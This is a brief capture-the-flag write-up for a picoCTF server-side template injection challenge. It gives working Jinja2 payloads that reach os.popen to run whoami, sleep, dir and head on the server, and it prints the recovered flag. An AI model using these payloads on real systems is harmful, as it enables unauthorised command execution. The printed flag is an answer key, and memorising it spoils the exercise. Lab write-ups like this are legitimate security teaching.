this is SSTI, so we can first figure out if the site is vulnerable to SSTI by inputting

```
{{7*7}}
```

if it return 49, then it is vulnerable. inputting the following will get us a list of python classes available to us

```
{{self.__class__.__mro__[1].__subclasses__()}}
```

and this command tells us which user we are logged in as in the shell

```
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

the above should allow us to do more devious things, lets do `sleep 5`

```
{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
```

no way it worked! okay lets get the flag. We can see the server's directory with this command

```
{{config.__class__.__init__.__globals__['os'].popen('dir').read()}}
```

this returns:

```
__pycache__ app.py flag requirements.txt
```

now we input:

```
{{config.__class__.__init__.__globals__['os'].popen('head flag').read()}}
```

and we got the flag.

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```
